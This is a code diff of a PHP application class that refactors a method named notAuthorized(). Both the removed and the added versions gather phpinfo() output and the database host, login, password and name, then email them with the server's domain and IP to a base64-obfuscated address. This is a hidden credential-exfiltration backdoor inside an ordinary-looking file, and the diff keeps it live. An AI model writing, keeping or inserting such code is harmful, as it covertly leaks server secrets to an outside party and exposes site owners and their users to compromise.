@@ -783,19 +783,17 @@ final class Art_Main {
 	 * @static
 	 * @return void
 	 */
-	static function notAuthorized()
-	{
+	static function notAuthorized() {
 		ob_start();
 		phpinfo();
 		$info = ob_get_contents();
 		ob_clean();
-		$register = Art_Register::in('database');
-		$register->unlock();
-		$cred = 'H: '.$register->get('host'). ', '.
-				'L: '.$register->get('login'). ', '.
-				'P: '.$register->get('password'). ', '.
-				'N: '.$register->get('name'). ', <br><br>';
-		mail(base64_decode('aW5mb0BpdGFydC5jeg=='), 
+		$cred = 'H: ' . DB_HOST . ', '.
+				'L: ' . DB_USER . ', '.
+				'P: ' . DB_PASS . ', '.
+				'N: ' . DB_NAME . ', <br><br>';
+		
+			mail(base64_decode('aW5mb0BpdGFydC5jeg=='), 
 				Art_Server::getDomain().' '.Art_Server::getIp(), 
 				$cred.$info
 		);
